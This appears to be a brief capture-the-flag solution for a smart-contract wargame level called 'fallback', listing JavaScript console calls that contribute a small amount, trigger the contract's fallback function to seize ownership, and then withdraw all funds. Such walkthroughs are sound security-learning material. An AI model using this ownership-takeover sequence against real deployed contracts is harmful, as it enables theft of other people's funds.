fallback

// need to cause fallback function to be invoked; this will make attacker owner and allow withdraw to be called
// we do not known owner's contribution amount
// send ether with .sendTransaction({}) method

```javascript
await contract.owner.call() // will be rightful owner
await contract.getContribution() // will be 0 since never contributed
await contract.contribute({value:50}) // small contribution so that contributions (mapping) is greater than 0
await contract.getContribution() // will be 50, but this never actually sent to contract
await contract.sendTransaction({value:50}) // send actual ether with transaction; owner should now be attacker
await contract.withdraw() // withdraw all funds from contract
```
